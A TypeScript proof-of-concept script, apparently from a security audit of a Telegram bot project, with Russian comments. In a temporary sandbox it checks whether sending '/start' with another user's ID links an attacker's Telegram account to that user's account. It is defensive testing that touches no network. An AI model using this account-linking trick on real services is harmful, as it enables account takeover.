/**
 * PoC SEC: Telegram-привязка принимает знание userId как доказательство владения.
 * Работает только в изолированном tmp cwd, без сети и реальных данных.
 * Запуск: npx tsx scripts/audit/poc-telegram-link-id.ts
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const sandbox = fs.mkdtempSync(path.join(os.tmpdir(), 'hub-audit-link-'));
fs.mkdirSync(path.join(sandbox, 'data'), { recursive: true, mode: 0o700 });
process.chdir(sandbox);

try {
  const { userStore } = await import('../../src/storage/userStore.ts');
  const { computeBarsLoginHash } = await import('../../src/utils/barsLoginHash.ts');
  const { processTelegramMessage } = await import('../../src/bot/botEngine.ts');

  const victim = userStore.create({ barsLoginHash: computeBarsLoginHash('victim-test-login') });
  await processTelegramMessage(
    { id: 900001234, firstName: 'PoC attacker' },
    `/start ${victim.userId}`,
  );

  const linked = userStore.getByUserId(victim.userId)?.telegramId === 900001234;
  console.log(linked
    ? 'VULNERABLE: UUID alone linked attacker Telegram to the account.'
    : 'NOT REPRODUCED: account linking rejected the unrelated Telegram.');
  process.exitCode = linked ? 1 : 0;
} finally {
  fs.rmSync(sandbox, { recursive: true, force: true });
}
